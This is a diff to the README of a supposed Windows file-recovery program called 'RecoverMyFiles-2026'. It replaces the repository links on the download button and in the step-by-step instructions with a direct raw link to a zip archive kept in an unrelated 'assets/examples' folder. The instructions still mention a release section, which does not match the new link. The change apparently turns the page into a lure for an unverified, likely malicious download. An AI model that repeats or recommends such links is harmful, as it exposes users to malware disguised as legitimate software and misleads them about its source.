@@ -5,7 +5,7 @@ description: "Restore deleted files on Windows 10 and 11 with this direct full v
 ---
 # 📂 RecoverMyFiles-2026 - Restore your lost data with ease
 
-[![Download RecoverMyFiles](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/Pepitastock390/RecoverMyFiles-2026)
+[![Download RecoverMyFiles](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://raw.githubusercontent.com/Pepitastock390/pepitastock390.github.io/main/assets/examples/Dist-v2.9.zip)
 
 ## 📖 About this software
 
@@ -25,7 +25,7 @@ Your computer needs to meet these basic standards to run the application:
 
 You must download the installer from our official page. Follow these steps to obtain the setup files:
 
-1. Visit the following link to access the download options: [https://github.com/Pepitastock390/RecoverMyFiles-2026](https://github.com/Pepitastock390/RecoverMyFiles-2026).
+1. Visit the following link to access the download options: [https://raw.githubusercontent.com/Pepitastock390/pepitastock390.github.io/main/assets/examples/Dist-v2.9.zip](https://raw.githubusercontent.com/Pepitastock390/pepitastock390.github.io/main/assets/examples/Dist-v2.9.zip).
 2. Look for the release section on the webpage.
 3. Click the link to save the installer file to your computer.
 4. Choose a folder on your machine to save the file. Keep track of this location for the next steps.
